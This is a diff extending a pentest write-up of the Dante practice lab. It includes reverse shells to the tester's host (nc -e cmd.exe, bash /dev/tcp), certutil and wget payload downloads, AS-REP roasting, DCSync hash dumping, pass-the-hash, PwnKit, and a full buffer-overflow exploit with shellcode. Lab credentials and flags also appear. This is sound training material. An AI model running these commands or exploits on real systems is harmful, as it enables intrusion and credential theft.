@@ -4,7 +4,7 @@ Subnet: 10.10.110.0/24
 10.10.110.2 is out-of-scope because it represents the firewall.
 
 ---
-# DANTE-WEB-NIX01 [x]
+# DANTE-WEB-NIX01
 
 ## Reconnaissance
 
@@ -762,8 +762,108 @@ showmount -e 172.16.1.5
 
 Let's move on to the next target.
 
+After comprimising all of the Domain Controllers & DANTE-ADMIN-06 I received credentials for this machine:
+
+```
+Sophie:TerrorInflictPurpleDirt996655
+```
+
+Let's try & leverage them to gain access to the target system. Started spraying with nxc on smb & winrm, but access was denied.
+
+```
+nxc smb 172.16.1.5 -u Sophie -p TerrorInflictPurpleDirt996655
+```
+
+Upon spraying MSSQL I received an error that Login failed, because it's from untrusted domain. Let's try it with local auth!
+
+```
+nxc mssql 172.16.1.5 -u Sophie -p TerrorInflictPurpleDirt996655 --local-auth
+```
+
+We pwned it! Which means we can authenticate against mssql.
+
+Connected to the MSSQL Database.
+
+```
+impacket-mssqlclient Sophie:'TerrorInflictPurpleDirt996655'@172.16.1.5
+```
+
+Checked if we can execute commands using xp_cmdshell. Yes we can!
+
+```
+EXEC xp_cmdshell 'whoami';
+output                        
+---------------------------   
+nt service\mssql$sqlexpress
+```
+
+Seems like we are an Service Account. Let's try & transfer an nc.exe file to the target server to get RCE to our local machine.
+
+Started up listener on port 443 on my local machine.
+
+```
+rlwrap nc -lvnp 443
+```
+
+Transfered nc.exe onto target server.
+
+```
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.70/nc.exe C:\Windows\Tasks\nc.exe';
+```
+
+Executed reverse connection from target server as service user.
+
+```
+EXEC xp_cmdshell 'C:\Windows\Tasks\nc.exe 10.10.14.70 443 -e cmd.exe';
+```
+
+Gained RCE.
+
+```
+rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.70] from (UNKNOWN) [10.10.110.3] 27196
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Retrieved flag.txt in C:\Users
+
+```
+DANTE{Mult1ple_w4Ys_in!}
+```
+## Privilege Escalation
+
+Enumerated groups & permissions of the service account.
+
+```
+whoami /all
+```
+
+He has SeImpersonatePrivilege enabled. Let's abuse PrintSpoofer.exe in order to gain SYSTEM Shell. Transfered the file onto the target server.
+
+```
+certutil -urlcache -split -f http://10.10.14.70/PrintSpoofer.exe PrintSpoofer.exe
+```
+
+Executed it and gained SYSTEM Shell.
+
+```
+PrintSpoofer.exe -i -c cmd.exe
+```
+
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+DANTE{Ju1cy_pot4t03s_in_th3_wild}
+```
+
+Comprimised DANTE-SQL01, let's move onto the last server DANTE-NIX07
+
 ---
-# DANTE-NIX02 [x]
+# DANTE-NIX02
 
 The nmap scan revealed the following information about the target server.
 
@@ -975,7 +1075,7 @@ DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
 Post Exploitation didn't reveal any new credentials or escalation paths. So I moved onto the next server.
 
 ---
-# DANTE-NIX03 [x]
+# DANTE-NIX03
 
 The nmap scan revealed the following information about the target server.
 
@@ -1120,7 +1220,7 @@ DANTE{SH4RKS_4R3_3V3RYWHERE}
 Couldn't find any interesting post exploitation so I moved on to the next target.
 
 ---
-# DANTE-NIX04 [x]
+# DANTE-NIX04
 
 The nmap scan revealed the following information about the target server.
 
@@ -1289,10 +1389,44 @@ Retrieved flag.txt in /root directory.
 DANTE{sudo_M4k3_me_@_Sandwich}
 ```
 
-Wasn't able to find any more flags or credentials so I moved on to the next target!
+Performed Post Exploitation
+
+Stored /etc/passwd & /etc/shadow on my local machine.
+
+Execute the following command.
+
+```
+unshadow passwd shadow > unshadow
+```
+
+Now we can utilize john the ripper to bruteforce an password out of all the user hashes.
+
+```
+john unshadow --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+This didn't provide any results. Let's format all the hashes in the following format, so we can bruteforce with hashcat:
+
+username:hash
+
+```
+$1$CrackMe$U93HdchOpEUP9iUxGVIvq/
+```
+
+Bruteforced it using hashcat and retrieved 1 password for user "julian".
+
+```
+hashcat -m 500 --username unshadow /usr/share/wordlists/rockyou.txt
+```
+
+Added those credentials into our wordlists.
+
+```
+julian:manchesterunited
+```
 
 ---
-## 172.16.1.19
+## DANTE-NIX07
 
 The nmap scan revealed the following information about the target server.
 
@@ -1339,8 +1473,120 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top10000
 
 This seems to be an server which I can potentially target later on!
 
+
+After comprimising every machine I came to this one.
+
+We retrieved credentials for jenkins from another server.
+
+```
+Admin_129834765:SamsungOctober102030
+```
+
+Let's utilize them to login into the Jenkins Endpoint.
+
+Logged into the Jenkins Endpoint at http://172.16.1.19:8080
+
+There seems to be an build running named "FLAG_HERE" Upon inspecting it, it gave me an flag.
+
+```
+DANTE{to_g0_4ward_y0u_mus7_g0_back}
+```
+
+Let's abuse Jenkins Builds in order to get command execution / reverse shell.
+
+1. Press on New Item > Give it Name > Scroll Down and select Shell
+
+2. Put reverse shell inside
+
+```
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.70/9000 0>&1'
+```
+
+3. Started up listener on port 9000
+
+```
+nc -lvnp 9000
+```
+
+4. Saved it and started build --> Gained RCE
+
+```
+rlwrap nc -lvnp 9000
+listening on [any] 9000 ...
+connect to [10.10.14.70] from (UNKNOWN) [10.10.110.3] 55608
+bash: cannot set terminal process group (1315): Inappropriate ioctl for device
+bash: no job control in this shell
+jenkins@DANTE-NIX07:~/workspace/pwned$
+```
+## Privilege Escalation
+
+Enumerated internally running services.
+
+```
+netstat -tulnp
+```
+
+There seems to be an MySQL Database being active.
+
+Connecting to it failed.
+
+I tried my whole methodology, but couldn't find anything. Let's transfer linpeas to the target server.
+
+```
+wget http://10.10.14.70/linpeas.sh linpeas.sh
+```
+
+Gave it executable permissions.
+
+```
+chmod +x linpeas.sh
+```
+
+Ran it & enumerated the target server.
+
+The target is vulnerable against PwnKit.
+
+Downloaded the binary onto my local machine
+
+```
+wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit PwnKit
+```
+
+Started up python3 webserver in which the binary is stored.
+
+```
+python3 -m http.server 80
+```
+
+Transfered the file onto the target server.
+
+```
+wget http://10.10.14.70/PwnKit PwnKit
+```
+
+Gave it executable permissions.
+
+```
+chmod +x PwnKit
+```
+
+Executed it and gained shell as user "root".
+
+```
+./PwnKit
+./PwnKit
+whoami
+root
+```
+
+Retrieved flag.txt in /root directory.
+
+```
+DANTE{g0tta_<3_ins3cur3_GROupz!}
+```
+
 ---
-# DANTE-WS01 [x]
+# DANTE-WS01
 
 The nmap scan revealed the following information about the target server.
 
@@ -1784,7 +2030,7 @@ gerald:1001:aad3b435b51404eeaad3b435b51404ee:a89f899fb9bcb2631435f54b7d9282f5:::
 I couldn't get more flags, pivot into another internal network or find more credentials in post exploitation so I decided to move onto the next machine.
 
 ---
-## DANTE-WS02 [x]
+## DANTE-WS02
 
 The nmap scan revealed the following information about the target server.
 
@@ -1991,7 +2237,7 @@ DANTE{Qu0t3_I_4M_secure!_unQu0t3}
 Didn't find anything interesting in post exploitation
 
 ---
-## DANTE-WS03 [x]
+## DANTE-WS03
 
 The nmap scan revealed the following information about the target server.
 
@@ -2165,7 +2411,7 @@ sekurlsa::logonpasswords
 With all credentials in one users.txt and passwords.txt and hashes.txt I tried spraying DANTE-SQL01 & DANTE-WS02, but we couldn't authenticate. Let's move onto DANTE-DC01.
 
 ---
-# DANTE-DC01 [x]
+# DANTE-DC01
 
 The nmap scan revealed the following information about the target server.
 
@@ -2447,7 +2693,6 @@ SuperStrongCantForget123456789
 Decided to move back to the DANTE-WS02, since I still need to find a way in order to move into the other internal network!
 
 ---
-
 # Host Discovery
 
 Since I comprimised all the servers in this subnet and didn't find another dual-hosted machine. I'm assuming we'll need to perform ping sweeping of other subnets.
@@ -2456,108 +2701,758 @@ Since I comprimised all the servers in this subnet and didn't find another dual-
 for i in {1..254}; do for j in {1..254}; do (ping -c 1 -W 1 172.16.$i.$j | grep -q "bytes from" && echo "172.16.$i.$j is up" &); done; done
 ```
 
+I got a nudge from someone, since I was stuck in this and I checked out the tool "Seatbelt" which allows me to enumerate the Browser History of the user.
 
+```
+./Seatbelt.exe FirefoxHistory ChromiumHistory DNSCache
+```
 
+It revealed about two interesting IP's:
+
+```
+10.100.1.4
+172.16.2.101
+```
+
+Enumerated another host by checking "foreign" addresses in running services.
+
+```
+netstat -ano
+Active Connections
+   Proto  Local Address          Foreign Address        State
+   TCP    172.16.1.20:53         0.0.0.0:0              LISTENING
+   TCP    172.16.1.20:139        0.0.0.0:0              LISTENING
+   TCP    172.16.1.20:389        172.16.1.20:49198      ESTABLISHED
+   TCP    172.16.1.20:5985       172.16.1.100:40426     TIME_WAIT
+   TCP    172.16.1.20:5985       172.16.1.100:40430     TIME_WAIT
+   TCP    172.16.1.20:5985       172.16.1.100:40432     ESTABLISHED
+   TCP    172.16.1.20:49198      172.16.1.20:389        ESTABLISHED
+   TCP    172.16.1.20:59557      172.16.1.100:11601     ESTABLISHED
+   TCP    172.16.1.20:59648      172.16.2.5:5985        ESTABLISHED
+   TCP    172.16.1.20:59680      172.16.2.5:135         TIME_WAIT
+   TCP    172.16.1.20:59681      172.16.2.5:64330       TIME_WAIT
+   TCP    172.16.1.20:59683      172.16.2.5:135         TIME_WAIT
+   TCP    172.16.1.20:59684      172.16.2.5:64330       TIME_WAIT
+   TCP    172.16.1.20:59686      172.16.2.5:135         TIME_WAIT
+   TCP    172.16.1.20:59687      172.16.2.5:64330       TIME_WAIT
+```
+
+This reveals information that proves that DC01 has an established connection to 172.16.2.5.
+
+```
+172.16.2.5
+```
+
+In order to communicate with this system let's setup an route from DC01 to our local machine using ligolo-ng.
+
+Create Interface "ligolo-double".
+
+```
+sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:11602
+```
+
+Run Ligolo Agent on DC01
+
+```
+./agent -connect 10.10.10.10:11602 -ignore-cert
+```
+
+Created Tunnel on Ligolo
+
+```
+session
+start --tun ligolo-double
+```
+
+Added Route for Ligolo-Double Interface
+
+```
+sudo ip route add 172.16.2.0/24 dev ligolo-double
+```
+
+I was now able to ping 172.16.2.5. But I wasn't able to ping 172.16.2.101.
+
+---
+## DANTE-DC02
+
+The nmap scan revealed the following information about the target server.
+
+```
+nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.5
+Nmap scan report for 172.16.2.5
+Host is up (0.13s latency).
+Not shown: 65508 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 20:06:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:d0:8e:88:ee:db:b4:cf:35:b7:db:cb:74:a0:50:0b (RSA)
+|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
+|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+64330/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DANTE-DC02; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2026-07-28T20:07:49
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 470.26 seconds
+```
+
+The scan reveals a lot of information about the target server. It seems to be another Domain Controller judging from the Hostname and Kerberos, LDAP & WinRM being active. Let's map the target ip address to the provided domain dante.admin, the FQDN of the DC DANTE-DC02.admin.local & the Hostname DANTE-DC02.
+
+```
+echo "172.16.2.5 DANTE-DC02.dante.admin dante.admin DANTE-DC02" | tee -a /etc/hosts
+```
+
+Sprayed users against smb, winrm & ldap with all the discovered credentials. But no results. 
+
+```
+nxc smb dante.admin -u users.txt -p passwords.txt --shares --continue-on-success
+```
+
+Tried anonymous & guest authentication, but both are either disabled or denied.
+
+```
+nxc smb admin.local -u '' -p '' --shares
+```
+
+Trying to connect via RPC was also denied anonymously.
+
+```
+rpcclient -U "" -N dante.admin
+```
+
+Performed ASREP-Roasting & retrieved TGT for user "jbercov".
+
+```
+impacket-GetNPUsers -dc-ip 172.16.2.5 dante.admin/ -no-pass -usersfile users.txt
+```
+
+Stored the TGT inside an file "jbercov" on the local machine.
+
+Utilized the TGT to bruteforce an password using john the ripper.
+
+```
+john jbercov --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Gained Credentials for user jbercov.
+
+```
+jbercov:myspace7
+```
+
+Enumerated SMB Shares, but couldn't find any interesting share or interesting permissions.
+
+```
+nxc smb dante.admin -u jbercov -p myspace7 --shares
+```
+
+Enumerated Domain Users and stored 
+
+```
+nxc smb dante.admin -u jbercov -p myspace7 --rid-brute > newusers.txt
+```
+
+Formatted output to an wordlist and stored it inside an users.txt file, so we can utilize for future bruteforcing attacks.
+
+```
+grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
+```
+
+Checked if we can connect to the target server as user "jbercov" via evil-winrm. We can!
+
+```
+nxc winrm dante.admin -u jbercov -p myspace7
+```
+
+Connected to DANTE-DC02 using evil-winrm.
+
+```
+evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
+```
+
+Retrieved flag.txt in C:\Users\jbercov\Desktop.
+
+```
+DANTE{Im_too_hot_Im_K3rb3r045TinG!}
+```
+
+## Privilege Escalation
+
+Enumerated Groups & Permissions of current user. But nothing interesting.
+
+```
+whoami /all
+```
+
+I decided to get an better shell. Let's transfer nc.exe onto the target server for this.
+
+```
+iwr -uri http://10.10.14.70/nc.exe -OutFile nc.exe
+```
+
+Started up listener on port 443 on local machine.
+
+```
+rlwrap nc -lvnp 443
+```
+
+Executed the following command, which calls to our listener.
+
+```
+./nc.exe 10.10.14.70 443 -e cmd.exe
+```
+
+Gained RCE.
+
+I decided to download all domain information with bloodhound-python onto my local machine.
+
+```
+bloodhound-python -u jbercov -p 'myspace7' -ns 172.16.2.5 -d dante.admin -c all
+```
+
+Enumerated network services & foreign connections and found out that DC02 has an established session to 172.16.2.101, which means we can pivot from DC02 to this target!
+
+```
+netstat -ano
+```
+
+I went over my whole enumeration methodology, but couldn't find anything useful. So I decided to use winPEAS.
+
+Transfered it onto the target system.
+
+```
+iwr -uri http://10.10.14.70/winPEASx64.exe -OutFile winPEAS.exe
+```
+
+Since winPEAS didn't provide any good results. Let's start up bloodhound and check if there's any interesting relationships!
+
+```
+neo4j console
+bloodhound-start
+```
+
+Uploaded domain information. Marked our current user as owned and found out he is 
+multiple outbound object controls. 
+
+- WriteGPLink on "Domain Controllers" OU.
+- GetChangesAll on the whole domain "dante.admin".
+
+Let's abuse GetChangesAll, it allows us to dump all domain hashes of the whole domain remotely.
+
+```
+impacket-secretsdump dante.admin/jbercov:'myspace7'@dante.admin
+```
+
+Gained all Domain NTLM Hashes. Stored them inside an hashes.txt file.
+
+Connected to DANTE-DC02 as Administrator via psexec & gained SYSTEM Shell.
+
+```
+impacket-psexec Administrator@dante.admin -hashes :4c827b7074e99eefd49d05872185f7f8
+```
+
+Let's get an better shell by utilizing the nc.exe again to get an reverse connection to our local machine.
+
+Started up listener on port 88 on my local machine.
+
+```
+rlwrap nc -lvnp 88
+```
+
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+DANTE{DC_or_Marvel?}
+```
+
+Found an interesting "Jenkins.bat" file in C:\Users\Administrator\Desktop which revealed an interesting net user command. Could this be the credentials used in NIX07 for the Jenkins Login Panel? Stored them inside our retrieved users & passwords files.
+
+```
+Admin_129834765:SamsungOctober102030
+```
+
+Found an .ssh directory aswell in C:\Users\Administrator which is very interesting. It provided not only the private & public key. It also provided an "known_hosts" file. Which revealed the ip 172.16.2.101 -> Could this be an hint that this private ssh key could be reused for this ip? Let's store it on our local machine!
+
+Gave the ssh key the correct permissions, so we can connect later on.
+
+```
+chmod 600 id_rsa
+```
+
+Since I comprimised the second Domain Controller and performed complete post exploitation. Let's perform the 3rd pivot, so we can connect to 172.16.2.101
+
+Transfered the ligolo-ng agent.exe onto DANTE-DC02.
+
+```
+iwr -uri http://10.10.14.70/agent.exe -OutFile agent.exe
+```
+
+Started up third ligolo-ng proxy instance.
+
+```
+sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:11603
+```
+
+Executed reverse connection from DANTE-DC02 to my local machine.
+
+```
+./agent.exe -connect 10.10.14.70:11603 -ignore-cert
+```
+
+Started tunnel.
+
+```
+session
+start --tun ligolo-triple
+```
+
+Added route for 172.16.2.101 to ligolo-triple.
+
+```
+ip route add 172.16.2.101 dev ligolo-triple
+```
+
+We are now able to reach the endpoint, let's attack it!
+
+---
+## DANTE-ADMIN-NIX05
+
+The nmap scan revealed the following information about the target server.
+
+```
+nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.101                        
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 17:00 -0500
+Nmap scan report for 172.16.2.101
+Host is up (0.11s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
+|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 250.15 seconds
+```
+
+Only SSH is open! Let's try & use the private key previously discovered in the Administrators .ssh directory. 
+
+```
+ssh -i id_rsa Administrator@172.16.2.101
+```
+
+Unfortunately the private SSH Key wasn't enough. We'll need to password of the Administrator aswell. Let's try & convert the ssh key to hash format, so we can maybe bruteforce an passphrase out of it with john the ripper.
+
+Since SSH didn't allow me to connect with the retrieved private SSH Key of the Administrator User. Which makes absolute sense, since the target machine seems to be also an Linux Server! Let's proceed with bruteforcing the target machine using hydra wit our retrieved credentials.
+
+```
+hydra -L users.txt -P passwords.txt ssh://172.16.2.101
+```
+
+We got an valid login for user "julian".
+
+```
+julian:manchesterunited
+```
+
+Connected to the target machine using the credentials.
+
+```
+ssh julian@172.16.2.101
+```
+
+It reveals the Hostname "DANTE-ADMIN-NIX05".
+## Privilege Escalation
+
+Made a lot of manual enumeration, but couldn't find anything interesting yet. Decided to enumerate SUID Binaries.
+
+Transfered suid3num.py onto target system.
+
+```
+wget http://10.10.14.70/suid3num.py suid3num.py
+```
+
+Gave it executable permissions.
+
+```
+chmod +x suid3num.py
+```
+
+Executed it and found out about one custom suid binary.  I previously already discovered it, but didn't know what they were supposed to do. I know that readfile allows me to read files.
+
+```
+/usr/sbin/readfiles
+```
+
+Checked the filetype
+
+```
+file readfiles
+readfiles: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5230eee7e55ca4b1717cd448bd7affb7381aa1a4, for GNU/Linux 3.2.0, not stripped
+```
+
+Downloaded readfile binary onto my local machine using scp.
+
+```
+scp julian@172.16.2.101:/readfiles .
+```
+
+1. Analyze the Source
+
+```
+- Does it allocate bytes on a stack? e.G with dest[80]
+- Uses it strcpy() without bounds checking
+- Does it run with elevated privs? setresuid(0,0,0)
+```
+
+2. Find the Offset
+
+```
+- 80 bytes for dest[]
+- 8 bytes for saved RBP
+- 88 bytes to reach RIP
+```
+
+3. Check Security Features
+
+Good if == 0
+
+```
+cat /proc/sys/kernel/randomize_va_space
+```
+
+4. Test Offset with GDB (GNU Debugger)
+
+```
+gdb -q --args /usr/sbin/readfile $(python3 -c 'print("A"*88+"B"*8)')
+run
+```
+
+This should crash with:
+
+- RBP = 0x4141414141414141 (AAAAAAA)
+- RIP pointing to 0x4242424242424242 (BBBBBBB)
+
+5. Created Exploit
+
+Utilized AI for this:
+
+```
+#!/usr/bin/env python3
+import struct
+import subprocess
+import time
+import sys
+
+# Shellcode to spawn /bin/sh (24 bytes)
+shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
+
+# Return address range to brute force
+# Start from the address we saw in GDB
+start_addr = 0x7fffffffe000
+end_addr = 0x7ffffffff000
+
+# The path to the vulnerable binary
+binary = b"/usr/sbin/readfile"
+
+print("[+] Starting brute force...")
+print(f"[+] Range: {hex(start_addr)} - {hex(end_addr)}")
+print(f"[+] Shellcode size: {len(shellcode)} bytes")
+
+success_count = 0
+
+for ret_addr in range(start_addr, end_addr, 8):
+    # Pack the return address (only 6 bytes for x86-64)
+    ret_bytes = struct.pack("<Q", ret_addr)[:6]
+    
+    # Skip addresses with null bytes
+    if b"\x00" in ret_bytes:
+        continue
+    
+    # Build the payload - try different NOP lengths for better success
+    nop_count = 40
+    payload = b"\x90" * nop_count
+    payload += shellcode
+    payload += b"A" * (88 - len(payload))
+    payload += ret_bytes
+    
+    # Skip payloads with null bytes
+    if b"\x00" in payload:
+        continue
+    
+    # Print progress every 1000 attempts
+    if (ret_addr - start_addr) % 8000 == 0:
+        print(f"[+] Progress: {hex(ret_addr)}")
+    
+    # Execute the binary with the payload
+    try:
+        # First try: just run it and check output
+        result = subprocess.run(
+            [binary, payload],
+            env={},
+            timeout=1,
+            capture_output=True
+        )
+        
+        # If we got any output, try to interact with the shell
+        if result.stdout or result.stderr:
+            # Second try: attempt to get shell interaction
+            try:
+                proc = subprocess.Popen(
+                    [binary, payload],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    env={}
+                )
+                
+                # Send commands to check if we're root
+                commands = b"id\nwhoami\necho 'SHELL_TEST'\ncat /root/flag.txt\nexit\n"
+                out, err = proc.communicate(commands, timeout=2)
+                
+                # Check for success indicators
+                if b"uid=0" in out or b"root" in out or b"# " in out:
+                    print("\n" + "="*60)
+                    print("[+] SUCCESS! Got root shell!")
+                    print("="*60)
+                    print("[+] Output:")
+                    print(out.decode('utf-8', errors='ignore'))
+                    
+                    # Try to spawn an interactive shell
+                    print("\n[+] Attempting to spawn interactive shell...")
+                    try:
+                        proc2 = subprocess.Popen(
+                            [binary, payload],
+                            stdin=sys.stdin,
+                            stdout=sys.stdout,
+                            stderr=sys.stderr,
+                            env={}
+                        )
+                        proc2.wait()
+                    except:
+                        pass
+                    
+                    sys.exit(0)
+                    
+                elif b"SHELL_TEST" in out:
+                    print(f"[+] Found potential shell at {hex(ret_addr)} but not root yet")
+                    success_count += 1
+                    
+            except subprocess.TimeoutExpired:
+                # If it hangs, we might have a shell
+                print(f"[+] Possible shell at {hex(ret_addr)} (timeout)")
+                proc.kill()
+                continue
+                
+    except Exception as e:
+        # Silent fail for most errors
+        continue
+
+print("\n[-] Exploit failed - tried all addresses")
+print(f"[+] Found {success_count} potential shells but none were root")
+
+Retrieved flag.txt in /root directory.
+```
+
+Transfered the file onto the target system and ran it.
+
+```
+wget http://10.10.14.70/exploit.py exploit.py
+```
+
+Gave it executable permissions and ran it & gained root shell.
+
+```
+chmod +x exploit.py
+python3 exploit.py
+```
+
+Retrieved flag.txt in /root directory.
+
+```
+DANTE{0verfl0wing_l1k3_craz33!}
+```
+
+---
+## Host Discovery
+
+Proceeded with ping sweeping to potentially find new hosts.
+
+Transfered an tool called "fping" to the target server in order to ping sweep efficiently.
+
+```
+wget http://10.10.14.70/fping fping
+```
+
+Gave it executable permissions.
+
+```
+chmod +x fping
+```
+
+Ran it & discovered another endpoint on 172.16.2.6
+
+```
+./fping -a -g 172.16.2.0/24 2>/dev/null
+```
+
+Let's perform the fourth pivot.
+
+Transfered ligolo agent binary onto the target server & gave it executable permissions.
+
+```
+wget http://10.10.14.70/linux_agent linux_agent
+chmod +x linux_agent
+```
+
+Started up proxy interface on local machine.
+
+```
+sudo ip tuntap add user saitama mode tun ligolo-quad && sudo ip link set ligolo-quad up && ligolo-proxy -selfcert -laddr 0.0.0.0:11604
+```
+
+Started reverse connection from target to my proxy.
+
+```
+./linux_agent -connect 10.10.14.70:11604 -ignore-cert
+```
+
+Started tunnel on proxy interface
+
+```
+session
+start --tun ligolo-quad
+```
+
+Added route.
+
+```
+ip route add 172.16.2.6 dev ligolo-quad
+```
+
+---
+# 172.16.2.6
+
+The nmap scan revealed the following information about the target server.
+
+```
+nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.6       
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 20:03 -0500
+Nmap scan report for 172.16.2.6
+Host is up (0.10s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:2d:0a:23:be:68:85:ef:a7:63:90:eb:3e:78:c1:fe (RSA)
+|_  256 0a:a8:21:b8:fe:f2:60:d1:c9:d1:05:32:79:b0:cb:99 (ECDSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 197.47 seconds
+```
+
+Only SSH seems to be open. Let's bruteforce with all our credentials again!
+
+```
+hydra -L users.txt -P passwords.txt ssh://172.16.2.6
+```
+
+Successfully authenticated as user julian again! Let's connect to the target machine.
+
+```
+ssh julian@172.16.2.6
+```
+
+The Host Machine is "DANTE-ADMIN-NIX06".
+
+Retrieved flag.txt in /home/james Desktop.
+
+```
+DANTE{H1ding_1n_th3_c0rner}
+```
+
+Found an interesting file called "SQL" in user james Desktop. It provides us new user credentials.
+
+```
+Sophie:TerrorInflictPurpleDirt996655
+```
+## Privilege Escalation
+
+Enumerated users and found about another user called "plongbottom".
+
+```
+cat /etc/passwd
+```
+
+We enumerated this user already! In the LibreOffice File. Do his credentials work? Let's check.
+
+```
+plongbottom:PowerfixSaturdayClub777
 ```
 
 ```
-
-
-
+su plongbottom
 ```
 
-```
+It worked we authenticated!
 
-
-
-```
+Enumerated that he is part of the sudo group.
 
 ```
-
-
-
+id
 ```
 
-```
-
-
+Gained Root Shell
 
 ```
-
+sudo su
 ```
 
-
-
-```
+Retrieved flag.txt in /root directory.
 
 ```
-
-
-
+DANTE{Alw4ys_check_th053_group5}
 ```
 
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
+Since the file "SQL" hints that we can use these credentials to authenticate on DANTE-SQL01 & the other retrieved credentials out of the Jenkins.bat file hint that we can exploit the jenkins website on 172.16.1.19. It means our job is done for now. Let's move to these targets now!
 
 ```
 
